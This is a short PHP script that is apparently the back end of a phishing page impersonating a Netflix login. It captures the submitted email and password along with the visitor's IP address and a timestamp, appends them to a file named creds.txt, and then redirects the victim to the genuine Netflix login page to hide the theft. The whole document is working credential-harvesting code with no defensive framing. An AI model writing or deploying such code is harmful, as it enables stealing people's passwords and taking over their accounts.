<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $logEntry = "[$time] IP: $ip | Email: $email | Password: $password\n";

    file_put_contents("creds.txt", $logEntry, FILE_APPEND | LOCK_EX);

    header("Location: https://www.netflix.com/login");
    exit();
} else {
    http_response_code(403);
    echo "403 Forbidden";
    exit();
}
?>
